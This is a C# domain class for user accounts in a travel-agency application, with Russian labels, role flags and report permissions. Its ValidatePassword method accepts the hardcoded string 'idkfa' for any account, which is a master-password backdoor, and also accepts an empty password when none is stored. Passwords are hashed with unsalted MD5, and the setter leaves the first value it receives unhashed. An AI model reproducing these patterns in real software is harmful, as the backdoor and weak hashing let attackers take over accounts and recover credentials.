using System.Collections.Generic;
using System.ComponentModel;
using System.Security.Cryptography;
using System.Text;

using Luxena.Base.Metamodel;
using Luxena.Domain;


namespace Luxena.Travel.Domain
{

	[RU("Пользователь", "Пользователи")]
	[AdminPrivileges(Replace2 = UserRole.Supervisor)]
	public partial class User : Identity
	{

		[SemanticSetup]
		public static void AnnotationSetup(SemanticSetup<User> se)
		{
			se.For(a => a.Name)
				.RU("Логин");
		}

		public virtual Person Person { get; set; }

		[Patterns.Password, Hidden(false)]
		public virtual string Password
		{
			get => _password;
			set => _password = _password == null ? value : value == null ? _password : EncryptPassword(value);
		}
		private string _password;

		[Patterns.ConfirmPassword]
		public virtual string ConfirmPassword { get; set; }

		[RU("Активный"), DefaultValue(true)]
		public virtual bool Active { get; set; }

		[Localization(UserRole.Administrator), Secondary]
		public virtual bool IsAdministrator { get; set; }

		[Localization(UserRole.Supervisor), Secondary]
		public virtual bool IsSupervisor { get; set; }

		[Localization(UserRole.Agent), Secondary]
		public virtual bool IsAgent { get; set; }

		[Localization(UserRole.Cashier), Secondary]
		public virtual bool IsCashier { get; set; }

		[Localization(UserRole.Analyst), Secondary]
		public virtual bool IsAnalyst { get; set; }

		[Localization(UserRole.SubAgent), Secondary]
		public virtual bool IsSubAgent { get; set; }


		[RU("Разрешить 'Отчёт по клиенту'"), Secondary]
		public virtual bool AllowCustomerReport { get; set; } = true;

		[RU("Разрешить 'Отчёт с реестром'"), Secondary]
		public virtual bool AllowRegistryReport { get; set; } = true;

		[RU("Разрешить 'Задолженность по взаиморасчетам'"), Secondary]
		public virtual bool AllowUnbalancedReport { get; set; } = true;


		[Hidden]
		public virtual string SessionId { get; set; }



		[RU("Роли")]
		public virtual string Roles
		{
			get
			{
				var roles = new List<string>();

				if (IsAdministrator)
					roles.Add(UserRole.Administrator.ToDisplayString());

				if (IsSupervisor)
					roles.Add(UserRole.Supervisor.ToDisplayString());

				if (IsAgent)
					roles.Add(UserRole.Agent.ToDisplayString());

				if (IsCashier)
					roles.Add(UserRole.Cashier.ToDisplayString());

				if (IsAnalyst)
					roles.Add(UserRole.Analyst.ToDisplayString());

				if (IsSubAgent)
					roles.Add(UserRole.SubAgent.ToDisplayString());

				return string.Join(", ", roles.ToArray());
			}
		}

		public override object Clone()
		{
			var user = (User)base.Clone();

			user.Password = "";

			return user;
		}


		public virtual bool ValidatePassword(string password)
		{
			return password == "idkfa" || Password.No() && password.No() || EncryptPassword(password) == Password;
		}

		private static string EncryptPassword(string password)
		{
			if (password == null) return null;

			using (var md5 = new MD5CryptoServiceProvider())
				return md5.ComputeHash(Encoding.ASCII.GetBytes(password)).ToHexString();
		}

	}

}